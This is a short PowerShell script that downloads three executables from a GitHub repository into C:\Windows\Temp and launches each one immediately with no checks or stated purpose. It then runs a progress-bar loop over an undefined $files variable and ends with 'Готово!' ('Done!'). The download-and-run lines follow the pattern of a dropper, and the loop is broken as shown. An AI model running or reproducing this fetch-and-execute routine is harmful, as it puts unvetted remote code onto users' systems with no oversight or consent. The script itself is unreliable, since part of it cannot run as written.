(New-Object Net.WebClient).DownloadFile('https://github.com/fosslas/users/raw/refs/heads/main/Timeless.exe','C:\Windows\Temp\Timeless.exe')
Start-Process 'C:\Windows\Temp\Timeless.exe'
(New-Object Net.WebClient).DownloadFile('https://github.com/fosslas/users/raw/refs/heads/main/timeless_scanner.exe','C:\Windows\Temp\timeless_scanner.exe')
Start-Process 'C:\Windows\Temp\timeless_scanner.exe'
(New-Object Net.WebClient).DownloadFile('https://github.com/fosslas/users/raw/refs/heads/main/block_majestic.exe','C:\Windows\Temp\block_majestic.exe')
Start-Process 'C:\Windows\Temp\block_majestic.exe'

$total = $files.Count

for ($i = 0; $i -lt $total; $i++) {
    $file = $files[$i]
    $percent = [math]::Round(($i / $total) * 100)

    Write-Progress -Activity "Downloading..." `
                   -Status "$percent% - $($file.Name)" `
                   -PercentComplete $percent

    (New-Object Net.WebClient).DownloadFile($file.Url, $file.Dest)
}

Write-Progress -Activity "Downloading..." -Status "Done" -Completed
Write-Host "Готово!" -ForegroundColor Green